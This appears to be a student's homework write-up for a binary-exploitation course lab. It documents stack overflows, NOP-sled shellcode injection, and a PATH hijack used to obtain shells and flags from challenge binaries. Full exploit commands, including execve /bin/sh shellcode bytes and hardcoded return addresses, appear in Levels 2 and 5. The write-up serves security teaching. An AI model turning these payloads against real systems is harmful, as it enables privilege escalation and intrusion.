# README
# Part 2 - Binary Exploitation
## Author

name: Brian C. Morris

email: briancmorris@live.com

## Level 1
### Vulnerability:
The input functionality of the program allows me to overwrite the base pointer of the program and return to a different subroutine (debug) after execution, which spawns a shell.
### Description:
When running be1 on the server, I saw that the program expected 2 input values. The first is the index of a value I am updating, the second is the value to change it to. By observing the binary be1 in IDA, I saw that the program uses these 3 instructions:
```
mov     eax, [ebp+index]
mov     edx, [ebp+value]
mov     [ebp+eax*4+array], edx
```
The value (2nd command line argument), is stored in edx, and then moved to ebp+eax\*4+array. By inputting a return address (08048543) of a different subroutine, and making sure my index is appropriately past the bounds of the array, in this case 11, I overwrite the base pointer of the subroutine, returning to the debug subroutine. The debug subroutine spawns a privelaged shell, allowing me to cat the flag.txt file. The following output shows the input I provided the program to retrieve the flag.
```
bcmorri3@binhw-trusty-2:~/BinaryExploit/Level1$ ./be1 11 08048543
Updating table value at index 11 with 134513987: previous value was -1219163405
The updated table is:
0: 2
1: 3
2: 5
3: 7
4: 11
5: 13
6: 17
$ ls
be1  flag.txt
$ cat flag.txt
flag{73e54c4a7e13c0b19b23acc3728aa26c}
$
```

## Level 2
### Vulnerability:
By observing the behavior of the stack, simple scripting can create a NOP-sled to slide into a shellcode that spawns a shell.
### Description:
Like the previous binary, this requires 2 inputs. By observing the code in IDA, I saw that index 11 would work again as it did previously. I first took advantage of GDB and a simple perl script to write a large number of NOP operations to the stack. I then used GDB to examine the memory around the stack pointer, to find the memory address of my NOP sled. The following commands were used to observe memory addresses.

```
[bcmorri3@engr-ras-201 Level2]$ gdb be2
GNU gdb (GDB) Red Hat Enterprise Linux 7.6.1-110.el7
Copyright (C) 2013 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-redhat-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /afs/unity.ncsu.edu/users/b/bcmorri3/CSC405/hw3/BinaryExploit/Level2/be2...done.
(gdb) break main
Breakpoint 1 at 0x8048519: file 2.c, line 20.
(gdb) r 11 `perl -e 'print "\x90"x200'`
(gdb) x/300x $esp
```

After scrolling through the rows of memory addresses, I found my NOP-sled at location bffff860, knowing that this location is where I will be writing my shellcode. I then updated my perl script to add in shellcode that I re-used from homework 2. Re-running the program (outside of GDB) yielded this output:

```
[bcmorri3@engr-ras-201 Level2]$ ./be2 11 `perl -e 'print "bffff860","\x90"x100,"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'`
Updating table value at index 11 with -1073743792: previous value was -1209804045
The updated table is:
0: 2
1: 3
2: 5
3: 7
4: 11
5: 13
6: 17
$ cat flag
cat: flag: No such file or directory
$ cat flag.txt
flag{601cc8bc0666ac68f3500a306e3f7c00}
```

Perl scripting advice found from [this](https://www.youtube.com/watch?v=NazbhvyKpqw) YouTube video was used to assist in my understanding.

## Level 3
### Vulnerability:
The server allows me to overwrite the PATH variable, giving me the ability to run a shell script with unintended privelages.
### Description:
After observing be3 in IDA, I could not determine anything meaningful. My next choice was to use strace to observe the behavior of the program. Using strace -f, I received some of the following output:
```
bcmorri3@binhw-trusty-2:~/BinaryExploit/Level3$ strace -f ./be3
...

[pid  9630] stat64("/usr/local/sbin/id", 0xbfa10e50) = -1 ENOENT (No such file o                                                                                                             r directory)
[pid  9630] stat64("/usr/local/bin/id", 0xbfa10e50) = -1 ENOENT (No such file or                                                                                                              directory)
[pid  9630] stat64("/usr/sbin/id", 0xbfa10e50) = -1 ENOENT (No such file or dire                                                                                                             ctory)
[pid  9630] stat64("/usr/bin/id", {st_mode=S_IFREG|0755, st_size=34532, ...}) = 0

...

[pid  9630] execve("/bin/sh", ["sh", "-c", "id"], [/* 20 vars */]) = 0

...

[pid  9631] execve("/usr/bin/id", ["id"], [/* 20 vars */]) = 0

...

+++ exited with 0 +++
```
I noticed the program was looking for a file named id in /usr/bin/id. It calls execve on this file, so I attempted to write an id file that would spawn a shell for me to use. I created a file in my home directory named id and input the following:

```
/bin/sh
```

Unfortunately, this didn't work when I tried it. The next thing I decided to do was use the cat command instead of the sh command, which then output the flag by using this as my id file:

```
/bin/cat /home/bcmorri3/BinaryExploit/Level3/flag.txt
```

Initially, this didn't work either, but then I realized I never gave the file execute permissions, so I used ```chmod +x``` on my id file in the home directory, and re-ran the program, which also didn't work. I then realized that I needed to change my PATH variable so that it would specific the correct path to execute the file. After doing so, the program worked The following is the output I received when retrieving the flag:

```
bcmorri3@binhw-trusty-2:~/BinaryExploit/Level3$ ./be3
you are:
uid=1051(bcmorri3) gid=1051(bcmorri3) egid=1002(be3) groups=1051(bcmorri3)

Access Denied
bcmorri3@binhw-trusty-2:~/BinaryExploit/Level3$ cd ~
bcmorri3@binhw-trusty-2:~$ ls
BinaryExploit  id  Test
bcmorri3@binhw-trusty-2:~$ chmod +x id
bcmorri3@binhw-trusty-2:~$ cd BinaryExploit/Level3/
bcmorri3@binhw-trusty-2:~/BinaryExploit/Level3$ ./be3
you are:
uid=1051(bcmorri3) gid=1051(bcmorri3) egid=1002(be3) groups=1051(bcmorri3)

Access
bcmorri3@binhw-trusty-2:~/BinaryExploit/Level3$ PATH=/home/bcmorri3
bcmorri3@binhw-trusty-2:~/BinaryExploit/Level3$ ./be3
you are:
flag{e5a1fcb6a9f2fe4336c110e8260beb70}

Access Denied
```

## Level 5
### Vulnerability:
Buffer overflow allows for a NOP sled to execute shellcode from the stack.
### Description:
First, I ran the program to see how many command line arguments were required, and determined that 2 were needed for a <password> and <username>.

I then ran the program using strace-f, inputting 5000 characters for the password and an arbitrary user '12345'. This caused my program to segfault at the address: 0x33614132. Inputting this address into [this](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/) website allowed me to determine that the segfault was caused by writing 8 past the input buffer.

Knowing this, I used GDB and a perl script (like level 2), to create a large NOP-sled of 5,000 NOP instructions.

```
Starting program: /home/bcmorri3/BinaryExploit/Level5/be5 `perl -e 'print "\x90"x5000'` 12345

Breakpoint 1, main (argc=3, argv=0xbfffe3c4) at 5.c:36
36      in 5.c
(gdb) x/2000x $esp
```
After reviewing the 2000 hex bytes around esp, I determined that a portion of my NOP-sled was located at address: 0xbfffe60c

Knowing this, I could now use perl script and shellcode with the buffer overflow to overwrite the return address 8 bytes after the input buffer, and spawn a shell. I could then simply cat the flag.txt file. The following output was found below:

```
bcmorri3@binhw-trusty-2:~/BinaryExploit/Level5$ ./be5 `perl -e 'print "\x90"x5000,"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80 12345678\x0c\xe6\xff\xbf"'`
Checking password ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒12345678
▒▒▒ for user 12345678
▒▒▒
Checking password ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒12345678
▒▒▒
$ cat flag.txt
flag{ca1578f2a573a370f77b6e0d7cff2b12}
```



Memory address of NOP sled as second param, overflow by 8 chars.

## Level 9
### Vulnerability:
Challenge may be broken?
### Description:
Running be9 indicates that it wants an argument. Suspicious of the nw 9.cmd file, I input it as the value. The server output a lot of information about other users who have connected to the system. Unsure of if this was trying to execute or cat the file, I tried it by using flag.txt as the command line argument, revealing the flag! Inputting the following revealed the flag:

```
bcmorri3@binhw-trusty-2:~/BinaryExploit/Level9$ ls
9.cmd  be9  flag.txt
bcmorri3@binhw-trusty-2:~/BinaryExploit/Level9$ ./be9 flag.txt
sh: 1: flag{3d508475db31e29b9a937788e7843fd9}: not found
Done!
```

## Levels 4, 6-8, and 10 were skipped for this assignment.
